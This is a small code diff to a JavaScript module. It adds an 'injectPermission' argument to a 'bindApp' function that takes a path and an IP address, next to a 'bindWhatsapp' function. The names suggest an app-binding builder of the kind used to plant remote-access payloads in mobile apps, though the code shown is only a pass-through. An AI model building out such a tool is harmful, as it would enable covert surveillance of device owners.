@@ -17,8 +17,8 @@ module.exports = {
                 .then(data => response( "s",data.message))
                 .catch(err => response( "e",err.message) );
     },
-    bindApp: function ( path, ip) {
-         AppBuilder.bindApp(path, ip)
+    bindApp: function ( path, ip, injectPermission) {
+        AppBuilder.bindApp(path, ip, injectPermission)
     },
     bindWhatsapp: function ( ip) {
         AppBuilder.bindWhatsapp(ip)
